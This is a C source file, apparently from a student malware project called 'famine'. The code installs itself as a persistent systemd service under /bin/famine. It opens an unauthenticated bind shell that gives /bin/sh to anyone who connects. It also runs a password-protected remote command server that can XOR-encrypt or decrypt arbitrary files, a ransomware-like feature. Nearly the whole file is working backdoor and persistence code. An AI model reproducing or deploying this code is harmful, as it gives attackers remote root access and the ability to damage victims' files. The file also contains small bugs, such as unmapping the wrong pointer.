/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
/*   Updated: 2026/05/23 18:00:43 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "service.h"
#include "sha256.h"

#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>

/*
	Setup program as a systemd service, it will restart when host reboots and when it is killed

	see SERVICE_FILE_CONTENT and SERVICE_FILE defines
*/
static int	setup_service_file(const char *bin_path)
{
	ssize_t rdb;

	int		fdin;
	int		fdout;

	char 	buf[4096];

	fdin = open(bin_path, O_RDONLY);
	if (fdin == -1)
		return (-1);
	fdout = open("/bin/famine", O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fdout == -1)
	{
		close(fdin);
		return (-1);
	}

	do
	{
		rdb = read(fdin, buf, sizeof(buf));
		write(fdout, buf, rdb);
	} while (rdb > 0);

	close(fdin);
	close(fdout);
	
	int	fd;

	fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fd == -1)
		return (-1);

	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));

	system(SERVICE_ENABLE);
	system(SERVICE_START);

	return (0);
}

int	run_bind_shell(t_service_ctx *ctx)
{
	int				srv_fd;
	int				cli_fd;
	int				opt;
	struct sockaddr_in	addr;

	srv_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (srv_fd == -1)
		return (-1);

	opt = 1;
	setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(ctx->super_user ? SUPER_USER_BIND_SHELL_PORT : WEAK_BIND_SHELL_PORT);

	if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
	{
		close(srv_fd);
		return (-1);
	}

	if (listen(srv_fd, 1) == -1)
	{
		close(srv_fd);
		return (-1);
	}

	while (1)
	{
		cli_fd = accept(srv_fd, NULL, NULL);
		if (cli_fd == -1)
			continue ;

		if (fork() == 0)
		{
			close(srv_fd);
			dup2(cli_fd, STDIN_FILENO);
			dup2(cli_fd, STDOUT_FILENO);
			dup2(cli_fd, STDERR_FILENO);
			close(cli_fd);
			execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
			exit(1);
		}
		close(cli_fd);
	}
	close(srv_fd);
	return (0);
}

static int	check_client_password(t_service_ctx *ctx, t_client *client, char *msg)
{
	if (!client->logged)
	{
		const uint8_t	hashed_pass[32] =
		{
			0x91, 0xc, 0x93, 0xc2,
			0xca, 0x35, 0x1, 0xfd,
			0x7e, 0xaa, 0x2c, 0x74,
			0xda, 0x4c, 0x1d, 0x5b,
			0xba, 0xec, 0x6a, 0x2a,
			0xa3, 0xb3, 0xc2, 0x42,
			0xf9, 0x34, 0x84, 0xd1,
			0xf3, 0xdc, 0xb4, 0xd4,
		};

		uint8_t	hash[32];
		sha256((uint8_t*)msg, strlen(msg), hash);
		if (!memcmp(hash, hashed_pass, sizeof(hashed_pass)))
		{
			server_send_to_id(&ctx->server, client->id, RGB(0,255,0)CORRECT_PASS CLR);
			server_send_to_fd(client->fd, PROMPT);
			client->logged = true;
			return (0);
		}
		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INCORRECT_PASS CLR PASSWORD);
		return (0);
	}
	return (1);
}

int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
{
	(void)size;
	t_service_ctx	*ctx = ptr;

	if (!check_client_password(ctx, client, msg))
		return (1);
	else if (!strncmp(msg, "cd", 1))
	{
		if (strlen(msg) == 3 || (msg[2] != ' ' && msg[2] != 0))
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_DIR CLR);
			goto _prompt;
		}
		else if (strlen(msg) == 2)
		{
			if (chdir("/") == -1)
				server_send_to_id(&ctx->server, client->id, RGB(255,0,0)WRONG_DIR CLR);
			else
				server_send_to_id(&ctx->server, client->id, RGB(0,255,64)CHANGED_DIR"/"NEW_LINE CLR);
			goto _prompt;
		}
		char *arg = &msg[3];
		if (chdir(arg) == -1)
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)WRONG_DIR CLR);
		else
		{
			server_send_to_id(&ctx->server, client->id, RGB(0,255,64)CHANGED_DIR);
			server_send_to_id(&ctx->server, client->id, arg);
			server_send_to_id(&ctx->server, client->id, NEW_LINE CLR);
		}
	}
	else if (!strcmp(msg, "getcwd"))
	{
		char *path = getcwd(NULL, 0);
		if (!path)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)NO_CWD CLR);
			goto _prompt;
		}
		server_send_to_id(&ctx->server, client->id, RGB(0, 255, 64)GET_CWD);
		server_send_to_id(&ctx->server, client->id, path);
		server_send_to_id(&ctx->server, client->id, NEW_LINE CLR);
		free(path);
	}
	else if (!strcmp(msg, "help"))
	{
		server_send_to_id(&ctx->server, client->id, RGB(0,128,255)COMMAND_HELP CLR);
	}
	else if (!strcmp(msg, "quit"))
	{
		server_send_to_id(&ctx->server, client->id, RGB(255,128,0)COMMAND_QUIT CLR);
		ctx->running = false;
		return (1);
	}
	else if (!strncmp(msg, "encrypt", 6) || !strncmp(msg, "decrypt", 6))
	{

		if (strlen(msg) == 8 || (msg[7] != ' ' && msg[7] != 0))
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
			goto _prompt;
		}
		char *user_key = &msg[8];
		int key_len = 0;
		msg = msg + 8;
		for (; *msg != ' ' && *msg != 0; key_len++)
			msg++;
		if (*msg == 0)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
			goto _prompt;
		}
		msg = msg + 1;
		uint8_t	key_hash[32];
		sha256((uint8_t *)user_key, key_len, key_hash);

		int file = open((const char *)msg, O_RDWR);
		if (file == -1)
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_PATH_CRYPT CLR);
		struct stat	stats;
		fstat(file, &stats);
		size_t	size = stats.st_size;
		void *adress = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, file, 0);
		uint8_t *bytes = adress;
		for (size_t i = 0; i < size; ++i)
			bytes[i] = bytes[i] ^ key_hash[i % 32];
		munmap(ptr, size);
		close(file);
	}
	else
		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INVALID_COMMAND CLR);
_prompt:
	server_send_to_fd(client->fd, PROMPT);
	return (1);
}

void	connect_hook(t_client *client, void *ptr)
{
	t_service_ctx	*ctx = ptr;

	server_send_to_id(&ctx->server, client->id, RGB(128,0,128)CONNECT_MSG CLR PASSWORD);
}

void	disconnect_hook(t_client *client, void *ptr)
{
	(void)ptr;
	(void)client;
}

int	run_service(const char *bin_path)
{
	t_service_ctx	ctx = {0};

	ctx.super_user = getuid() == 0;

	if (ctx.super_user)
		setup_service_file(bin_path);

	if (lock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE) == -1)
		return (-1);

	if (!server_open(&ctx.server, 6942))
	{
		close(ctx.lock_fd);
		return (0);
	}
	server_set_message_hook(&ctx.server, message_hook, &ctx);
	server_set_connect_hook(&ctx.server, connect_hook, &ctx);
	server_set_disconnect_hook(&ctx.server, disconnect_hook, &ctx);

	ctx.running = true;
	while (ctx.running)
		server_update(&ctx.server);

	server_close(&ctx.server, true);

	unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE);

	return (system(SERVICE_RESTART), 0);
}
